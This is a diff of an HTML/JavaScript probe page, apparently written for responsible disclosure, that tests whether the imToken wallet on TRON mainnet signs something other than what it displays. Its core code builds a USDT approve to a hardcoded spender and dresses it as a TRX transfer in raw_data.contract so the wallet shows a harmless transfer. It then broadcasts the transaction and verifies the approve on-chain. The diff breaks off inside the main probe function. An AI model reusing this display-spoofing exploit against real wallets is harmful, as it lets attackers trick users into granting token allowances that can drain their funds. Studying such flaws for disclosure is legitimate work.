@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>imToken TRON 所见非所签安全测试与验证</title>
+  <title>imToken TRON Allowance 查询 & 所见非所签探针</title>
   <style>
     :root { --bg: #0b0f14; --card: #131a22; --border: #253040; --text: #e1e6ed; --text2: #8899aa; --red: #f04343; --orange: #e6a23c; --green: #2ecc71; --blue: #4d94ff; }
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -17,10 +17,8 @@
     .value { text-align: right; word-break: break-all; font-family: monospace; font-size: 12px; }
     .btn { width: 100%; padding: 14px 0; border-radius: 10px; border: none; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; }
     .btn-connect { background: var(--green); color: #000; }
-    .btn-normal { background: var(--blue); color: #fff; }
-    .btn-approve { background: var(--orange); color: #000; }
-    .btn-mixed { background: #e64343; color: #fff; }
-    .btn-check { background: var(--blue); color: #fff; }
+    .btn-allowance { background: var(--blue); color: #fff; }
+    .btn-probe { background: #e64343; color: #fff; }
     .log-box { background: #090d13; border: 1px solid var(--border); border-radius: 10px; padding: 10px; font-family: monospace; font-size: 11px; max-height: 380px; overflow-y: auto; color: #aab5c0; margin-top: 8px; }
     .log-line { padding: 2px 0; }
     .log-error { color: var(--red); }
@@ -30,98 +28,285 @@
     .warning-box { background: rgba(240,67,67,0.08); border: 1px solid rgba(240,67,67,0.2); border-radius: 8px; padding: 10px; font-size: 12px; color: var(--red); margin-top: 10px; }
     .highlight-green { color: var(--green); font-weight: 500; }
     .highlight-red { color: var(--red); font-weight: 500; }
+    .highlight-orange { color: var(--orange); font-weight: 500; }
     .attribution { font-size: 11px; color: var(--text2); text-align: center; margin-top: 4px; }
   </style>
 </head>
 <body>
 
+  <!-- ====== Card 0: 测试说明 ====== -->
   <div class="card">
-    <div class=”card-header”><span class=”dot red”></span> “所见非所签”安全测试模型</div>
-    <div style=”font-size:13px; color:var(--text2); line-height:1.6;”>
-      ① <span class=”highlight-green”>普通 TRX 转账</span> — 验证 <code>tron.sendTransaction</code> 入口可用<br>
-      ② <span class=”highlight-green”>原始 USDT approve</span> — 验证合约调用可正常上链<br>
-      ③ <span class=”highlight-red”>hex/json 不一致探针</span> — raw_data_hex=approve，raw_data.contract=transfer<br>
-      ⑤ <span class=”highlight-red”>完整探针（带回链验证）</span> — 同上+广播后查链上实际合约类型<br>
+    <div class="card-header"><span class="dot red"></span> Allowance 查询 & "所见非所签"探针</div>
+    <div style="font-size:13px; color:var(--text2); line-height:1.6;">
+      步骤：<br>
+      ① <span class="highlight-green">连接 imToken 钱包</span> → 获取 <code>ownerAddress</code><br>
+      ② <span class="highlight-green">查询 allowance</span> → <code>allowance(ownerAddress, TP3NQwSaEHYs7cowWFWq5ozNkeG4ie3Wbi)</code><br>
+      ③ <span class="highlight-red">发起探针交易</span> → raw_data_hex=approve, raw_data.contract=TransferContract<br>
+      ④ <span class="highlight-orange">回链验证</span> → 查链上 <code>contract.type</code> 判定实际执行<br>
       <br>
-      测试原理：签名锚定 raw_data_hex（执行层=approve），但 raw_data.contract 是 TransferContract（显示层=转账）<br>
-      经 imToken 签名广播后回链查 contract.type：TriggerSmartContract → 漏洞成立；TransferContract → 所见即所签<br>
-      <span style=”color:var(--orange);”>⚠️ 取决于 imToken 签名时信任 hex 还是重新序列化 raw_data。</span>
+      原理：签名锚定 raw_data_hex（执行层=approve），raw_data.contract 是 TransferContract（显示层=转账）<br>
+      经 imToken 签名广播后回链查 contract.type：<br>
+      <span class="highlight-red">TriggerSmartContract → 漏洞成立（所见≠所签）</span><br>
+      <span class="highlight-green">TransferContract → 所见即所签（无此漏洞）</span>
     </div>
     <div class="warning-box">
-      ⚠️ 所有按钮均会真实签名并广播交易，请务必使用无资产测试钱包。
+      ⚠️ 所有按钮均会真实签名并广播交易，请务必使用<strong>无资产测试钱包</strong>。
     </div>
   </div>
 
+  <!-- ====== Card 1: 钱包连接 & 操作 ====== -->
   <div class="card" id="statusCard">
     <div class="card-header"><span class="dot orange" id="dotStatus"></span> 钱包状态</div>
     <div id="beforeConnect">
       <div class="row"><span class="label">状态</span><span class="value">未连接</span></div>
-      <button class="btn btn-connect" id="btnConnect">连接 imToken 钱包</button>
+      <button class="btn btn-connect" id="btnConnect">① 连接 imToken 钱包</button>
     </div>
     <div id="afterConnect" style="display:none;">
-      <div class="row"><span class="label">地址</span><span class="value" id="addrText"></span></div>
-      <div class="row"><span class="label">TRX</span><span class="value" id="trxBal"></span></div>
+      <div class="row"><span class="label">ownerAddress</span><span class="value" id="addrText"></span></div>
+      <div class="row"><span class="label">TRX 余额</span><span class="value" id="trxBal"></span></div>
       <div class="row"><span class="label">网络</span><span class="value">TRON 主网</span></div>
-      <button class="btn btn-normal" id="btnNormal">① 普通 TRX 转账 (0.1 TRX)</button>
-      <button class="btn btn-approve" id="btnApprove">② 原始 USDT approve (1 USDT)</button>
-      <button class="btn btn-mixed" id="btnMixed">③ hex/json 不一致：hex=approve, UI=转账</button>
-      <button class="btn btn-check" id="btnCheckAllowance" style="margin-top:14px;">④ 查询 USDT 授权额度</button>
-      <button class="btn btn-check" id="btnDirectTest" style="margin-top:14px; background:#e6a23c; color:#000;">⑤ 完整探针：签名+广播+回链验证合约类型</button>
+      <button class="btn btn-allowance" id="btnQueryAllowance">② 查询 USDT allowance(owner, spender)</button>
+      <button class="btn btn-probe" id="btnProbe">③ 发起"所见非所签"探针交易</button>
+      <button class="btn btn-allowance" id="btnQueryAgain" style="margin-top:6px; background:var(--orange); color:#000;">④ 再次查询 allowance（验证变化）</button>
     </div>
   </div>
 
+  <!-- ====== Card 2: Allowance 结果 ====== -->
   <div class="card" id="allowanceCard" style="display:none;">
-    <div class="card-header"><span class="dot orange"></span> USDT 授权额度</div>
-    <div class="row"><span class="label">当前授权</span><span class="value" id="currentAllowance">--</span></div>
+    <div class="card-header"><span class="dot orange"></span> USDT Allowance 查询结果</div>
+    <div class="row"><span class="label">ownerAddress</span><span class="value" id="showOwner">--</span></div>
+    <div class="row"><span class="label">spenderAddress</span><span class="value" id="showSpender">--</span></div>
+    <div class="row"><span class="label">allowance</span><span class="value" id="showAllowance" style="font-size:14px;">--</span></div>
     <div class="row"><span class="label">变化</span><span class="value" id="allowanceChange">--</span></div>
-    <div class="info-box">
-      若③或⑤成功广播且回链 contract.type 为 TriggerSmartContract，同时授权额度增加，则安全测试验证成功（需结合弹窗截图与 txid 作为完整证据）。
+    <div class="info-box" id="allowanceInfo" style="display:none;">
+      若 allowance 增加 → 链上已执行 approve → 探针成功触发"所见非所签"
     </div>
   </div>
 
+  <!-- ====== Card 3: 探针回链验证结果 ====== -->
+  <div class="card" id="probeResultCard" style="display:none;">
+    <div class="card-header"><span class="dot orange"></span> 探针回链验证</div>
+    <div class="row"><span class="label">广播 TXID</span><span class="value" id="probeTxid">--</span></div>
+    <div class="row"><span class="label">链上 contract.type</span><span class="value" id="probeOnchainType" style="font-size:14px;">--</span></div>
+    <div class="row"><span class="label">结论</span><span class="value" id="probeVerdict" style="font-size:14px;">--</span></div>
+    <div class="info-box" id="probeInfoBox">
+      等待探针完成…
+    </div>
+  </div>
+
+  <!-- ====== Card 4: 运行日志 ====== -->
   <div class="card">
     <div class="card-header"><span class="dot orange"></span> 运行日志</div>
     <div class="log-box" id="logContainer">等待操作…</div>
   </div>
 
-  <div class="attribution">仅供安全研究与负责任披露</div>
+  <div class="attribution">仅供安全研究与负责任披露 | 基于 imToken TRON "所见非所签" 核心逻辑分析</div>
 
 <script>
 (function() {
-  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-  const SPENDER = 'TP3NQwSaEHYs7cowWFWq5ozNkeG4ie3Wbi';
-  const APPROVE_AMOUNT = '1000000'; // 1 USDT (6 decimals)
+  // ==================== 常量 ====================
+  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  // USDT (TRC20)
+  const SPENDER = 'TP3NQwSaEHYs7cowWFWq5ozNkeG4ie3Wbi';        // 授权目标
+  const APPROVE_AMOUNT = '1000000';  // 1 USDT (6 decimals)
   const TRON_API = 'https://api.trongrid.io';
 
-  let walletAddr = '';
-  let initialAllowance = null;
+  // ==================== 全局状态 ====================
+  let walletAddr = '';           // ownerAddress
+  let initialAllowance = null;   // 初始授权额度
 
+  // ==================== DOM 快捷方法 ====================
   const $ = id => document.getElementById(id);
-  function log(msg, type = '') {
-    const div = document.createElement('div');
+
+  function log(msg, type) {
+    type = type || '';
+    var div = document.createElement('div');
     div.className = 'log-line' + (type ? ' log-' + type : '');
     div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
     $('logContainer').appendChild(div);
     $('logContainer').scrollTop = $('logContainer').scrollHeight;
   }
 
+  // ==================== 环境检测 ====================
   function hasBridge() {
-    return typeof window.imToken !== 'undefined' && typeof window.imToken.callPromisifyAPI === 'function';
+    return typeof window.imToken !== 'undefined'
+        && typeof window.imToken.callPromisifyAPI === 'function';
   }
 
+  // ==================== TXID 提取（兼容多种返回格式） ====================
   function findTxId(value) {
     if (typeof value === 'string' && /^[0-9a-fA-F]{64}$/.test(value)) return value;
     if (!value || typeof value !== 'object') return '';
-    const candidates = [
+    var candidates = [
       value.txid, value.txID, value.txId, value.tx_hash,
-      value.transaction_id, value.data?.txid, value.data?.txID
+      value.transaction_id,
+      value.data && value.data.txid,
+      value.data && value.data.txID
     ];
-    return candidates.find(item => typeof item === 'string' && /^[0-9a-fA-F]{64}$/.test(item)) || '';
+    for (var i = 0; i < candidates.length; i++) {
+      if (typeof candidates[i] === 'string' && /^[0-9a-fA-F]{64}$/.test(candidates[i])) {
+        return candidates[i];
+      }
+    }
+    return '';
   }
 
+  // ==================== ① 连接 imToken 钱包 ====================
+  async function connect() {
+    log('检查 imToken 桥接环境…', 'warn');
+
+    if (!hasBridge()) {
+      log('未检测到 imToken 桥接，请在 imToken DApp 浏览器中打开此页面', 'error');
+      return;
+    }
+    log('imToken 桥接环境就绪', 'success');
+
+    // 等待 tronWeb 就绪
+    for (var i = 0; i < 10; i++) {
+      if (window.tronWeb && window.tronWeb.ready) break;
+      await new Promise(function(r) { setTimeout(r, 600); });
+    }
+
+    // 尝试从 tronWeb 获取地址
+    if (window.tronWeb && window.tronWeb.ready) {
+      walletAddr = window.tronWeb.defaultAddress.base58;
+      log('从 tronWeb 获取地址: ' + walletAddr, 'success');
+    }
+
+    // 兜底：通过 imToken bridge 获取
+    if (!walletAddr) {
+      try {
+        var accounts = await window.imToken.callPromisifyAPI('tron_requestAccounts');
+        walletAddr = Array.isArray(accounts) && accounts.length ? accounts[0] : accounts;
+        log('从 imToken bridge 获取地址: ' + walletAddr, 'success');
+      } catch (e) {
+        log('获取地址失败: ' + (e.message || e), 'error');
+        return;
+      }
+    }
+
+    // 校验地址格式（TRON base58 地址长度 34）
+    if (!walletAddr || walletAddr.length !== 34) {
+      log('地址格式无效: ' + walletAddr, 'error');
+      return;
+    }
+
+    // 显示地址
+    $('addrText').textContent = walletAddr;
+
+    // 查询 TRX 余额
+    try {
+      var resp = await fetch(TRON_API + '/v1/accounts/' + walletAddr);
+      var data = await resp.json();
+      var trx = (data.data && data.data[0] && data.data[0].balance || 0) / 1e6;
+      $('trxBal').textContent = trx.toFixed(2) + ' TRX';
+    } catch (e) {
+      $('trxBal').textContent = '查询失败';
+    }
+
+    // 更新 UI 状态
+    $('dotStatus').className = 'dot green';
+    $('beforeConnect').style.display = 'none';
+    $('afterConnect').style.display = 'block';
+    log('已连接钱包，ownerAddress = ' + walletAddr, 'success');
+
+    // 立即查询初始 allowance
+    await queryAndShowAllowance(true);
+  }
+
+  // ==================== ② 查询 USDT allowance ====================
+  async function callAllowance(owner, spender) {
+    try {
+      var ownerHex = window.tronWeb.address.toHex(owner);
+      var contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+
+      // 调用 TRC20 allowance(address,address) 常量方法
+      var result = await window.tronWeb.transactionBuilder.triggerConstantContract(
+        contractHex,
+        'allowance(address,address)',
+        {},  // options
+        [
+          { type: 'address', value: owner },
+          { type: 'address', value: spender }
+        ],
+        ownerHex
+      );
+
+      if (result && result.constant_result && result.constant_result[0]) {
+        return BigInt('0x' + result.constant_result[0]);
+      }
+      return null;
+    } catch (e) {
+      log('allowance 查询失败: ' + (e.message || e), 'error');
+      return null;
+    }
+  }
+
+  function formatUSDT(weiAmount) {
+    if (weiAmount === null || weiAmount === undefined) return '--';
+    try {
+      // USDT 6 decimals
+      var num = Number(weiAmount) / 1e6;
+      return num.toFixed(2) + ' USDT';
+    } catch (e) {
+      return String(weiAmount);
+    }
+  }
+
+  async function queryAndShowAllowance(isInit) {
+    if (!walletAddr) {
+      log('请先连接钱包', 'warn');
+      return;
+    }
+
+    log('查询 allowance(' + walletAddr.slice(0, 8) + '…, ' + SPENDER.slice(0, 8) + '…) …', 'warn');
+
+    var allowance = await callAllowance(walletAddr, SPENDER);
+
+    if (allowance === null) {
+      log('allowance 查询失败', 'error');
+      $('showAllowance').textContent = '查询失败';
+      return;
+    }
+
+    // 显示结果
+    $('allowanceCard').style.display = 'block';
+    $('showOwner').textContent = walletAddr;
+    $('showSpender').textContent = SPENDER;
+    $('showAllowance').textContent = formatUSDT(allowance);
+
+    log('当前 allowance = ' + formatUSDT(allowance), 'success');
+
+    if (isInit) {
+      // 记录初始值
+      initialAllowance = allowance;
+      $('allowanceChange').textContent = '初始值（基线）';
+      $('allowanceChange').style.color = 'var(--text2)';
+      $('allowanceInfo').style.display = 'none';
+      log('初始 allowance 基线已记录: ' + formatUSDT(initialAllowance), 'info');
+    } else if (initialAllowance !== null) {
+      // 计算变化
+      var diff = allowance - initialAllowance;
+      if (diff > 0n) {
+        $('allowanceChange').textContent = '🔴 +' + formatUSDT(diff);
+        $('allowanceChange').style.color = 'var(--red)';
+        $('allowanceInfo').style.display = 'block';
+        log('⚠️ 授权额度增加 +' + formatUSDT(diff) + '！链上已执行 approve，所见非所签漏洞成立！', 'error');
+      } else if (diff < 0n) {
+        $('allowanceChange').textContent = '🟢 ' + formatUSDT(diff);
+        $('allowanceChange').style.color = 'var(--green)';
+      } else {
+        $('allowanceChange').textContent = '无变化';
+        $('allowanceChange').style.color = 'var(--text2)';
+        log('allowance 无变化', 'warn');
+      }
+    }
+  }
+
+  // ==================== 验证交易结构 ====================
   function validateBridgeTxShape(tx) {
-    const contract = tx?.raw_data?.contract?.[0];
-    const problems = [];
+    var contract = tx && tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0];
+    var problems = [];
+
     if (!contract || typeof contract !== 'object') {
       problems.push('raw_data.contract[0] 缺失');
       return problems;
@@ -145,348 +330,249 @@
     return problems;
   }
 
-  async function connect() {
-    log('检查钱包环境…', 'warn');
-    if (!hasBridge()) {
-      log('未检测到 imToken 桥接，请在 DApp 浏览器中打开', 'error');
-      return;
-    }
-    for (let i = 0; i < 10; i++) {
-      if (window.tronWeb?.ready) break;
-      await new Promise(r => setTimeout(r, 600));
-    }
-    if (window.tronWeb?.ready) {
-      walletAddr = window.tronWeb.defaultAddress.base58;
-    } else {
-      try {
-        const accounts = await window.imToken.callPromisifyAPI('tron_requestAccounts');
-        walletAddr = Array.isArray(accounts) && accounts.length ? accounts[0] : accounts;
-      } catch (e) {
-        log('获取地址失败: ' + e.message, 'error');
-        return;
-      }
-    }
-    if (!walletAddr || walletAddr.length !== 34) {
-      log('地址无效', 'error');
-      return;
-    }
-    $('addrText').textContent = walletAddr;
-    try {
-      const resp = await fetch(TRON_API + '/v1/accounts/' + walletAddr);
-      const data = await resp.json();
-      $('trxBal').textContent = ((data.data?.[0]?.balance || 0) / 1e6).toFixed(2) + ' TRX';
-    } catch { $('trxBal').textContent = '--'; }
-    $('dotStatus').className = 'dot green';
-    $('beforeConnect').style.display = 'none';
-    $('afterConnect').style.display = 'block';
-    log('已连接: ' + walletAddr, 'success');
-    await refreshAllowanceUI(true);
-  }
-
-  // Allowance 查询
-  async function queryAllowance(owner, spender) {
-    try {
-      const ownerHex = window.tronWeb.address.toHex(owner);
-      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
-      const result = await window.tronWeb.transactionBuilder.triggerConstantContract(
-        contractHex, 'allowance(address,address)', {},
-        [{ type: 'address', value: owner }, { type: 'address', value: spender }],
-        ownerHex
-      );
-      if (result?.constant_result?.[0]) return BigInt('0x' + result.constant_result[0]);
-      return null;
-    } catch (e) { log('查询 allowance 失败: ' + e.message, 'error'); return null; }
-  }
-  function formatAmount(wei) {
-    if (wei == null) return '--';
-    try { return (Number(wei) / 1e6).toFixed(2) + ' USDT'; } catch { return String(wei); }
-  }
-  async function refreshAllowanceUI(init = false) {
-    if (!walletAddr) return;
-    const allowance = await queryAllowance(walletAddr, SPENDER);
-    if (allowance == null) {
-      $('currentAllowance').textContent = '查询失败';
-      $('allowanceChange').textContent = '--';
-      return;
-    }
-    $('currentAllowance').textContent = formatAmount(allowance);
-    $('allowanceCard').style.display = 'block';
-    if (init) {
-      initialAllowance = allowance;
-      $('allowanceChange').textContent = '初始值';
-    } else if (initialAllowance != null) {
-      const diff = allowance - initialAllowance;
-      if (diff > 0n) {
-        $('allowanceChange').textContent = '+' + formatAmount(diff);
-        $('allowanceChange').style.color = 'var(--red)';
-        log('⚠️ 授权额度增加！链上已执行 approve。', 'error');
-      } else {
-        $('allowanceChange').textContent = '无变化';
-      }
-    }
-  }
-
-  // 发送交易
+  // ==================== 发送交易（经 imToken 签名+广播） ====================
   async function sendTx(tx, desc) {
-    log(`发送 ${desc} …`, 'warn');
-    // 打印交易关键信息用于调试
-    const firstContract = tx.raw_data?.contract?.[0];
-    log('TX contract 键顺序: ' + Object.keys(firstContract || {}).join(' → '), 'warn');
-    log('TX raw_data.contract: ' + JSON.stringify(firstContract), 'warn');
-    log('TX raw_data_hex 前64字节: ' + (tx.raw_data_hex || '').slice(0, 64), 'warn');
-    const shapeProblems = validateBridgeTxShape(tx);
+    log('发送: ' + desc + ' …', 'warn');
+
+    // 打印关键调试信息
+    var firstContract = tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0];
+    if (firstContract) {
+      log('TX contract.type = ' + firstContract.type + '（UI 显示层）', 'warn');
+      log('TX raw_data_hex 前64: ' + (tx.raw_data_hex || '').slice(0, 64), 'warn');
+      var hasApproveSelector = (tx.raw_data_hex || '').indexOf('095ea7b3') !== -1;
+      log('TX raw_data_hex 含 approve 选择器 095ea7b3: ' + hasApproveSelector,
+          hasApproveSelector ? 'success' : 'error');
+    }
+
+    // 结构校验
+    var shapeProblems = validateBridgeTxShape(tx);
     if (shapeProblems.length) {
-      log('已阻止调用 imToken 原生桥: ' + shapeProblems.join('；'), 'error');
-      log('该结构不是标准 TRON 交易，钱包确认页可能因解引用缺失字段而退出', 'error');
+      log('结构校验失败: ' + shapeProblems.join('；'), 'error');
       return false;
     }
+    log('结构校验通过', 'success');
+
+    // 调用 imToken 桥
     try {
-      const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
-        tx, from: walletAddr, useTronHeader: true
+      var res = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
+        tx: tx,
+        from: walletAddr,
+        useTronHeader: true
       });
-      log('原始返回: ' + JSON.stringify(res), 'warn');
-      const rid = findTxId(res);
-      if (rid) {
-        log('✅ 交易已广播! TXID: ' + rid, 'success');
-        log('Tronscan: https://tronscan.org/#/transaction/' + rid, 'info');
-        return true;
-      } else if (res?.result === true || res === true) {
-        log('接口仅返回 result=true，未返回 64 位 TXID，不能据此确认广播成功', 'warn');
-        return false;
+      log('imToken 原始返回: ' + JSON.stringify(res), 'warn');
+
+      var txid = findTxId(res);
+      if (txid) {
+        log('✅ 交易已广播! TXID: ' + txid, 'success');
+        log('Tronscan: https://tronscan.org/#/transaction/' + txid, 'info');
+        return txid;  // 返回 txid 用于回链验证
+      } else if (res && (res.result === true || res === true)) {
+        log('接口仅返回 result=true，未返回 64 位 TXID', 'warn');
+        return null;
       } else {
-        log('未返回有效的 64 位 TXID，不能确认广播成功', 'error');
-        return false;
+        log('未返回有效的 64 位 TXID', 'error');
+        return null;
       }
     } catch (e) {
-      const message = String(e?.message || '');
-      const code = String(e?.code || e?.data?.code || '');
-      const normalized = (code + ' ' + message).toLowerCase();
-      log('错误 message: ' + message, 'error');
+      var message = String(e.message || e);
+      var code = String(e.code || (e.data && e.data.code) || '');
+      var normalized = (code + ' ' + message).toLowerCase();
+
       log('错误 code: ' + (code || 'N/A'), 'error');
-      log('完整错误: ' + JSON.stringify(e, Object.getOwnPropertyNames(e)), 'error');
-      if (normalized.includes('user_rejected') || normalized.includes('reject')) {
+      log('错误 message: ' + message, 'error');
+
+      if (normalized.indexOf('user_rejected') !== -1 || normalized.indexOf('reject') !== -1) {
         log('→ 用户在钱包弹窗取消', 'warn');
-      } else if (normalized.includes('contract_validate_error') || message.includes('合约调用校验错误')) {
-        log('→ CONTRACT_VALIDATE_ERROR：合约/参数校验失败，不等同于 SIGERROR', 'error');
-      } else if (normalized.includes('sigerror') || normalized.includes('validate signature')) {
-        log('→ SIGERROR：签名与节点重建出的 raw_data 不一致，或签名权限不匹配', 'error');
-      } else if (normalized.includes('invalid_tx') || normalized.includes('validrawtx')) {
-        log('→ imToken 桥接层校验拦截 (validRawTx)', 'error');
-      } else if (normalized.includes('server')) {
-        log('→ 服务端返回错误，但当前信息不足以判定为签名错误', 'error');
+      } else if (normalized.indexOf('contract_validate') !== -1 || message.indexOf('合约调用校验错误') !== -1) {
+        log('→ CONTRACT_VALIDATE_ERROR：合约/参数/余额/能量校验失败', 'error');
+      } else if (normalized.indexOf('sigerror') !== -1 || normalized.indexOf('validate signature') !== -1) {
+        log('→ SIGERROR：签名不一致 → imToken 对 hex/json 做了一致性校验，该版本有防护', 'error');
+      } else if (normalized.indexOf('invalid_tx') !== -1 || normalized.indexOf('validrawtx') !== -1) {
+        log('→ imToken 桥接层 validRawTx 校验拦截（有防护）', 'error');
       }
       return false;
     }
   }
 
-  // ① 普通 TRX 转账
-  async function normalTrx() {
-    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
-    log('构造普通 TRX 转账…', 'warn');
-    try {
-      const tx = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
-      log('构造成功', 'success');
-      await sendTx(tx, '普通 TRX 转账');
-    } catch (e) { log('构造失败: ' + (e.message || e), 'error'); }
-  }
-
-  // ② 原始 USDT approve
-  async function originalApprove() {
-    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
-    log('构造原始 approve…', 'warn');
-    try {
-      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
-      const userHex = window.tronWeb.address.toHex(walletAddr);
-      const { transaction, result } = await window.tronWeb.transactionBuilder.triggerSmartContract(
-        contractHex, 'approve(address,uint256)',
-        { feeLimit: 100_000_000, callValue: 0 },
-        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
-        userHex
-      );
-      if (!result?.result) { log('生成失败', 'error'); return; }
-      log('原始 approve 构造成功', 'success');
-      await sendTx(transaction, '原始 USDT approve');
-    } catch (e) { log('构造失败: ' + (e.message || e), 'error'); }
-  }
-
-  // ③ hex/json 不一致探针（简洁版）
-  // raw_data_hex / txID 锚定 approve（签名+执行权威），raw_data.contract 替换为 TransferContract（UI 显示）
-  // 经 imToken 签名广播；若成功上链，回链查 contract.type 判定实际执行类型
-  async function mixedTx() {
-    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
-    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
-    log('━━━━ hex/json 不一致探针 ━━━━', 'warn');
-    try {
-      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
-      const userHex = window.tronWeb.address.toHex(walletAddr);
-
-      // 执行层：标准 approve（决定 txID + raw_data_hex + 签名锚定）
-      const built = await window.tronWeb.transactionBuilder.triggerSmartContract(
-        contractHex, 'approve(address,uint256)',
-        { feeLimit: 100_000_000, callValue: 0 },
-        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
-        userHex
-      );
-      if (!built.result?.result) { log('approve 构造失败', 'error'); return; }
-      const approveTx = built.transaction;
-
-      // 显示层：真实 TransferContract（字段完整，UI 可正常解析）
-      const transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
-      const transferContract = transferBuilt.raw_data.contract[0];
-
-      // 组装：hex/txID=approve，contract=transfer
-      const submitTx = {
-        visible: approveTx.visible,
-        txID: approveTx.txID,
-        raw_data: Object.assign({}, approveTx.raw_data, { contract: [transferContract] }),
-        raw_data_hex: approveTx.raw_data_hex
-      };
-
-      log(`[执行层] txID=${approveTx.txID}`, 'warn');
-      log(`[显示层] contract.type=${transferContract.type}（UI 预期：TRX 转账 0.1）`, 'warn');
-      log(`[签名] raw_data_hex 含 approve 选择器: ${approveTx.raw_data_hex.includes('095ea7b3')}`, 'success');
-      log('━━━━━━━━━━━━━━━━━━━━', 'warn');
-
-      const ok = await sendTx(submitTx, 'hex/json 不一致探针');
-      if (ok) {
-        // 广播后 12s 回链验证
-        setTimeout(async () => {
-          // 从 sendTx 日志里无法直接拿到 txid，这里先查 allowance 变化作为旁证
-          await refreshAllowanceUI(false);
-          log('⚠ 若授权额度增加 → 漏洞成立。完整回链验证请用⑤按钮', 'warn');
-        }, 12000);
-      } else {
-        log('⚠ 若未闪退且弹窗正常显示 → 桥接层接受了结构（结构合法）', 'warn');
-      }
-    } catch (e) {
-      log('构造失败: ' + (e.message || e), 'error');
-    }
-  }
-
-  // 回链查询某笔交易实际记录的合约类型（判定"执行层"到底是什么）
+  // ==================== 回链查询 contract.type ====================
   async function fetchOnchainType(txid) {
     try {
-      const r = await fetch(TRON_API + '/wallet/gettransactionbyid', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
+      var r = await fetch(TRON_API + '/wallet/gettransactionbyid', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ value: txid })
       });
-      const d = await r.json();
-      return d?.raw_data?.contract?.[0]?.type || '';
-    } catch (e) { return ''; }
-  }
-  async function fetchOnchainTypeRetry(txid, tries) {
-    for (let i = 0; i < tries; i++) {
-      const t = await fetchOnchainType(txid);
-      if (t) return t;
-      await new Promise(r => setTimeout(r, 4000));
+      var d = await r.json();
+      var onchainType = d && d.raw_data && d.raw_data.contract && d.raw_data.contract[0]
+                         && d.raw_data.contract[0].type;
+      return onchainType || '';
+    } catch (e) {
+      log('回链查询异常: ' + (e.message || e), 'error');
+      return '';
     }
+  }
+
+  async function fetchOnchainTypeRetry(txid, tries) {
+    for (var i = 0; i < tries; i++) {
+      var t = await fetchOnchainType(txid);
+      if (t) {
+        log('回链第 ' + (i + 1) + ' 次查询成功，contract.type = ' + t, 'success');
+        return t;
+      }
+      log('回链第 ' + (i + 1) + ' 次查询未确认（tx 可能尚未打包），等待 4s…', 'warn');
+      await new Promise(function(r) { setTimeout(r, 4000); });
+    }
+    log('回链查询超时，tx 可能未被节点接受', 'warn');
     return '';
   }
 
-  // ⑤ 所见非所签探针（修正版）
-  // 关键事实：节点验签与执行都锚定同一份 raw_data 的 protobuf 序列化，txID = sha256(raw_data)。
-  //   所以"直接广播一笔显示≠执行的交易"在节点层无法通过验签（raw_data 是 transfer 就执行 transfer，
-  //   数字键 / raw_data_hex 节点都不认）。真正能制造"显示≠执行"缝隙的，只有 imToken 客户端
-  //   是否信任 raw_data_hex。
-  // 因此本探针：raw_data_hex / txID 锚定 approve（执行+签名权威），raw_data.contract 叠加为真实
-  //   TransferContract（仅供 UI 显示），二者自洽到能产出有效签名；经 imToken 签名广播后回链查
-  //   contract.type 判定：
-  //     · TriggerSmartContract → imToken 以 hex 为准 → UI 转账 / 链上 approve → 漏洞成立
-  //     · TransferContract     → imToken 以 raw_data 为准 → 所见即所签 → 无此漏洞
-  async function directBroadcastTest() {
-    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
-    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
-    log('=== 所见非所签探针（修正版）===', 'warn');
-    try {
-      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
-      const userHex = window.tronWeb.address.toHex(walletAddr);
+  // ==================== ③ "所见非所签"探针（核心） ====================
+  // 执行层：approve → raw_data_hex / txID = approve（签名锚定 + 链上语义）
+  // 显示层：TransferContract → raw_data.contract = transfer（imToken UI 显示转账）
+  // 节点按 protobuf 字段号重建 → 得到 approve → 验签通过 → approve 上链
+  async function runProbe() {
+    if (!window.tronWeb || !window.tronWeb.transactionBuilder) {
+      log('tronWeb 未就绪', 'error');
+      return;
+    }
+    if (!walletAddr) {
+      log('请先连接钱包', 'error');
+      return;
+    }
 
-      // 1) 执行层（权威）：标准 approve —— 决定签名锚定与链上语义
-      const built = await window.tronWeb.transactionBuilder.triggerSmartContract(
-        contractHex, 'approve(address,uint256)',
-        { feeLimit: 100_000_000, callValue: 0 },
-        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+    log('══════════ 所见非所签探针 ══════════', 'warn');
+    log('执行层 = USDT approve → 签名锚定 + 链上执行', 'warn');
+    log('显示层 = TransferContract → imToken UI 显示 TRX 转账', 'warn');
+    log('═══════════════════════════════════', 'warn');
+
+    try {
+      var contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+      var userHex = window.tronWeb.address.toHex(walletAddr);
+
+      // ===== Step 1: 构造执行层——标准 USDT approve =====
